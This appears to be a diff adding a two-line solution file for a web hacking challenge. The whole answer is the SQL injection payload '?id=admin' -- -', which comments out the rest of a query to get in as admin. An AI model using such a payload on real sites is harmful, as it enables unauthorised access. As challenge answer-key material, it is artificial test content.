@@ -1,0 +1,2 @@
+# Solution..!
+?id=admin' -- -
